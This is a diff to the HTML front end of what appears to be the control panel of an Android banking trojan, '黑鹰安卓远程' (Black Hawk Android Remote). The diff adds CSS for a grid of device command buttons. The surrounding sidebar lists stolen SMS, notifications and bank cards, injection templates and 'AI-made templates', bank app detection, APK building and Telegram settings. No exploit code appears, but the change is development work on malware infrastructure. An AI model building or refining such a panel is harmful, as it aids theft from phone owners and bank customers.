@@ -180,6 +180,19 @@
 @media(max-height:740px){#detail .bh-commands-wrap{height:clamp(140px,29vh,184px)!important}#detail .screens{min-height:90px!important}}
 @media(max-width:1100px){#detail .commands{grid-template-columns:repeat(4,minmax(0,1fr)) 8px repeat(4,minmax(0,1fr))!important}}
 </style>
+
+<style id="bh-ref-buttons-20261015">
+/* Exact 4+4 six-row visual grid from the provided reference. Device APIs unchanged. */
+#detail .bh-commands-wrap{height:clamp(158px,24vh,208px)!important;overflow:hidden!important;padding:5px!important;border-radius:10px!important}
+#detail .commands{grid-template-columns:repeat(4,minmax(0,1fr)) 12px repeat(4,minmax(0,1fr))!important;grid-template-rows:repeat(6,minmax(0,1fr))!important;gap:5px!important;overflow:hidden!important}
+#detail .commands button{font-size:clamp(9px,.63vw,11px)!important;line-height:1.05!important;padding:2px 3px!important;border-radius:6px!important;font-weight:600!important;white-space:normal!important}
+#detail .commands button:nth-child(8n + 5){grid-column:6!important}
+#detail .commands button.be-ready:not(.bh-state-on){background:#2a73ee!important;color:white!important;border-color:#4a91ff!important}
+#detail .commands button[disabled]{background:#111820!important;color:#536174!important;border-color:#323c48!important}
+#detail .commands button.bh-state-on{background:#c32235!important;color:#fff!important;border-color:#e34255!important}
+#detail .quick.bh-quick{gap:8px!important}
+@media(max-height:700px){#detail .bh-commands-wrap{height:clamp(146px,28vh,182px)!important}#detail .commands{gap:3px!important}}
+</style>
 </head><body>
 <aside class="side" id="sidebar"><div class="brand"><span class="eagle">🦅</span>黑鹰安卓远程</div><button><span class="ico">⌂</span>控制台</button><div class="group-title">数据管理</div><button class="active"><span class="ico">▣</span>设备</button><button><span class="ico">▤</span>短信</button><button><span class="ico">♧</span>通知</button><button><span class="ico">▭</span>银行卡</button><button><span class="ico">▣</span>注入数据</button><div class="group-title">设备管理</div><button><span class="ico">♧</span>分组管理　⌄</button><button><span class="ico">⊘</span>黑名单</button><div class="group-title">注入策略</div><button><span class="ico">◎</span>应用设置</button><button><span class="ico">♢</span>注入模板</button><button><span class="ico">✣</span>AI制作模板</button><button><span class="ico">♧</span>短信通知规则</button><button><span class="ico">▤</span>银行检测配置</button><div class="group-title">构建分发</div><button><span class="ico">⚒</span>APK构建</button><div class="group-title">系统设置</div><button><span class="ico">♙</span>用户设置</button><button><span class="ico">♢</span>安全中心</button><button><span class="ico">▤</span>服务器状态</button><button><span class="ico">⌁</span>TURN节点</button><button><span class="ico">▤</span>Telegram设置</button><div class="bottom"><span class="dot">●</span> 系统运行中　v2.0</div></aside>
 <main class="viewport" id="main">
